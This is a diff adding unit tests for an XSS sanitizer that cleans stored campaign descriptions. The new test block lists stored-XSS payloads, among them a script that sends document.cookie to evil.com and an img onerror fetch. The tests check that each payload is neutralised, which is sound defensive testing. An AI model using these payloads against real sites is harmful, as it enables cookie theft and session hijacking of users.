@@ -33,4 +33,35 @@ describe('sanitizeRichText (XSS defence for stored rich text)', () => {
     expect(out).toContain('href="https://example.com"')
     expect(out).toContain('noopener')
   })
+
+  // Campaign opportunityDescription is rendered with dangerouslySetInnerHTML,
+  // and the CSP allows 'unsafe-inline' for scripts — so anything stored raw
+  // would execute for every member. These are the exact payloads a
+  // compromised admin could try (the C1 finding).
+  describe('stored-XSS payloads in campaign descriptions', () => {
+    const payloads = [
+      '<script>fetch("https://evil.com?c="+document.cookie)</script>',
+      '<img src=x onerror="fetch(\'https://evil.com\')">',
+      '<svg/onload=alert(1)>',
+      '<iframe src="javascript:alert(1)"></iframe>',
+      '<body onload=alert(1)>',
+      '<a href="javascript:alert(1)">click me</a>',
+    ]
+
+    it.each(payloads)('neutralises: %s', (payload) => {
+      const out = sanitizeRichText(payload)
+      expect(out).not.toMatch(/<script/i)
+      expect(out).not.toMatch(/<iframe/i)
+      expect(out).not.toMatch(/onerror=/i)
+      expect(out).not.toMatch(/onload=/i)
+      expect(out.toLowerCase()).not.toContain('javascript:')
+    })
+
+    it('keeps the legitimate formatting an admin would actually write', () => {
+      const real = '<p>Gifted <strong>skincare</strong> bundle.</p><ul><li>1 x Reel</li></ul>'
+      const out = sanitizeRichText(real)
+      expect(out).toContain('<strong>skincare</strong>')
+      expect(out).toContain('<li>1 x Reel</li>')
+    })
+  })
 })
